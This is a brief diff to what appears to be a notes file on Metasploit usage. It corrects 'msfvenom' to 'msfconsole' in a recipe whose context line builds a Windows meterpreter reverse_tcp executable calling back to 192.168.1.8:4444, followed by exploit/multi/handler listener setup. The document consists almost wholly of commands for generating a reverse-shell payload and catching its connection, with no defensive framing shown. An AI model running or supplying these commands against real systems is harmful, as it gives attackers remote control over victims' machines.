@@ -3,7 +3,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f exe 
 
 EXECUTE PAYLOAD:-
 
-msfvenom
+msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 show options
